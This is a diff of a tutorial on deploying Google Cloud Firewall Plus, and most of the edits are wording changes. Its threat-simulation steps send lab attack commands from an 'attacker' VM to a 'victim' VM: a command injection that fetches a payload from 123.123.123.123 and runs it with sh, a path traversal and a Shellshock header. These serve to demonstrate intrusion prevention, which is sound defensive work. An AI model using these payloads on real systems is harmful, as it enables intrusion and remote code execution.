@@ -4,7 +4,7 @@ This tutorial shows how to deploy and use [Google Cloud Firewall Plus](https://w
 
 [Cloud Firewall](https://cloud.google.com/firewall?hl=en) is a fully distributed firewall service with advanced protection capabilities, micro-segmentation, and pervasive coverage to protect your Google Cloud workloads from internal and external threats, including: intrusion, malware, spyware, and command-and-control. The service works by creating Google-managed zonal [firewall endpoints](https://cloud.google.com/firewall/docs/about-firewall-endpoints) that use packet intercept technology to transparently inspect the workloads for the configured threat signatures and protect them against threats.
 
-<img src="images/architecture.png" alt="architecture.png"  width="100%" />
+<img src="images/diagram.png" alt="diagram.png"  width="100%" />
 
 ---
 > [!NOTE]
@@ -187,7 +187,7 @@ Prepare for deployment by enabling the required APIs, retrieving the deployment 
         --quiet
     ```
 
-    > :bulb: **Learning Objective** <br> 
+    > :bulb: **Objective** <br> 
     > Security profiles define layer 7 inspection policies for Google Cloud resources, offering application layer services like intrusion prevention through firewall endpoints. Security profile groups serve as a container for these profiles and are referenced within firewall policies to redirect network traffic. 
     <br>
 
@@ -209,7 +209,7 @@ Prepare for deployment by enabling the required APIs, retrieving the deployment 
         --project=$PROJECT_ID
     ```
 
-    > :bulb: **Learning Objective** <br>
+    > :bulb: **Objective** <br>
     > Each severity level has an associated default action. The default action specifies the action to take against threats based on the threat's severity level.  You can use security profiles to override the default action for a severity level. 
     <br>
 
@@ -238,7 +238,7 @@ Prepare for deployment by enabling the required APIs, retrieving the deployment 
     done
     ```
 
-    > :bulb: **Learning Objective** <br> 
+    > :bulb: **Objective** <br> 
     > A firewall endpoint is a organizational resource that inspect intercepted traffic with Palo Alto Networks Threat Prevention technologies. 
     <br>
 
@@ -268,11 +268,11 @@ Prepare for deployment by enabling the required APIs, retrieving the deployment 
     done
     ```
 
-    > :bulb: **Learning Objective** <br> 
+    > :bulb: **Objective** <br> 
     > The firewall endpoint can be associated with one or more VPC networks within the same zone.  If a firewall policy attached to your VPC network has layer 7 inspection enabled, matching traffic is transparently redirected to the endpoint for inspection. 
     <br>
 
-7. Create a Network Firewall Policy with two firewall rules to allow all ingress & egress traffic to the workload network.
+7. Create a [Network Firewall Policy](https://cloud.google.com/firewall/docs/network-firewall-policies) with two firewall rules to allow all ingress & egress traffic to the workload network.
 
     ```
     gcloud compute network-firewall-policies create $PREFIX-global-policy \
@@ -302,7 +302,7 @@ Prepare for deployment by enabling the required APIs, retrieving the deployment 
         --project=$PROJECT_ID
     ```
 
-    > :bulb: **Learning Objective** <br> 
+    > :bulb: **Objective** <br> 
     > A Network Firewall Policy can be shared across networks within a Google Cloud organization.  This simplifies the configuration and management of firewall rules.
     > The firewall policies created, do not redirect traffic to the Firewall Endpoint.  This will be done later in the tutorial.
     <br>
@@ -317,7 +317,7 @@ Prepare for deployment by enabling the required APIs, retrieving the deployment 
         --global-firewall-policy
     ```
 
-    > :bulb: **Learning Objective** <br> 
+    > :bulb: **Objective** <br> 
     > A Network Firewall Policy is an organizational resource, enabling you to apply policies across networks, projects, and folders.
     <br>
 
@@ -335,14 +335,12 @@ Simulate several threats between the `attacker` and `victim` virtual machines wi
 
 <img src="images/allow.png" alt="topology.png"  width="100%" />
 
-1. In Cloud Shell, open an SSH session to the `attacker` VM (password: `kali`).
+1. In Cloud Shell, open an SSH session to the `attacker` VM.
     ```
-    gcloud compute ssh kali@$PREFIX-attacker \
-        --zone=$ZONE \
-        --project=$PROJECT_ID
+    gcloud compute ssh paloalto@$PREFIX-attacker --zone=$ZONE --project=$PROJECT_ID
     ```
 
-2. From the `attacker` VM, simulate threats to the `victim` (`10.0.0.20`) VM.
+2. From the `attacker` VM, simulate sudo-threats to the `victim` (`10.0.0.20`) VM.
     ```
     curl "http://10.0.0.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
     curl http://10.0.0.20/?item=../../../../WINNT/win.ini -m 5
@@ -356,7 +354,7 @@ Simulate several threats between the `attacker` and `victim` virtual machines wi
     wget www.eicar.org/download/eicar.com.txt --tries 1 --timeout 2
     ```
 
-    > :bulb: **Learning Objective** <br>
+    > :bulb: **Objective** <br>
     > The above threat simulations should be successful.  This is because the Firewall Endpoint is not inspecting the traffic between the `attacker` and `victim` virtual machines. 
     <br>
 
@@ -388,9 +386,9 @@ Update the network firewall policies to redirect traffic to the firewall endpoin
         --security-profile-group=//networksecurity.googleapis.com/organizations/$ORG_ID/locations/global/securityProfileGroups/$PREFIX-profile-group
     ```
 
-### Simulate threats
+### Replay threats
 
-Simulate the same threats used previously. 
+Rerun the previous threats again to see the actions taken by Cloud Firewall Plus.
 
 1. In Cloud Shell, open an SSH session to the `attacker` VM (password: `kali`).
     
@@ -398,7 +396,7 @@ Simulate the same threats used previously.
     gcloud compute ssh paloalto@$PREFIX-attacker --zone=$ZONE --project=$PROJECT_ID
     ```
 
-2. From the `attacker` VM, simulate threats to the `victim` (`10.0.0.20`) VM.
+2. From the `attacker` VM, simulate sudo-threats to the `victim` (`10.0.0.20`) VM.
 
     ```
     curl "http://10.0.0.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
@@ -407,25 +405,25 @@ Simulate the same threats used previously.
     curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' -m 5 http://10.0.0.20/cgi-bin/test-critical -m 5
     ```
 
-3. Attempt to download a sudo malicious file from the internet. 
+3. Attempt to download a sudo-malicious file from the internet. 
 
     ```
     wget www.eicar.org/download/eicar.com.txt --tries 1 --timeout 2
     ```
-    > :bulb: **Learning Objective** <br>
+    > :bulb: **Objective** <br>
     > The simulated threats from the `attacker` should fail.  This is because the Firewall Plus service is preventing the exploits from reaching the `victim` machine.
     <br>
 
-### View Threats
+### View threats
 
 View the actions taken by the Firewall Plus service directly within the Google Cloud console. 
 
 1. In the Google Cloud console, go to **[Network Security → Threats](https://console.cloud.google.com/net-security/threats/)**.
 
-    <img src="images/threats.png" alt="threats.png"  width="100%" />
+    <img src="images/logs.png" alt="logs.png"  width="100%" />
     <br>
 
-    > :bulb: **Learning Objective** <br>
+    > :bulb: **Objective** <br>
     > You should see the actions taken by the Firewall Plus endpoint, indicating the service has detected and/or stopped the simulated threats.
     >
     > The action taken against a threat is determined by the security profile group applied to the network firewall rule. 
@@ -449,6 +447,9 @@ To delete the created resources, delete your Google Cloud deployment project.  I
     ```
 
 ## More Information
+
+Please see the materials below for more information about the topics discussed in this tutorial.
+
 * [Announcement Palo Alto Networks with Google Cloud Firewall](https://www.paloaltonetworks.com/blog/network-security/netsec-google-cloud-firewall-plus/)
 * [Palo Alto Networks with Google Cloud](https://cloud.google.com/palo-alto-networks)
 * [Cloud Firewall Plus Overview](https://cloud.google.com/firewall/docs/about-intrusion-prevention)
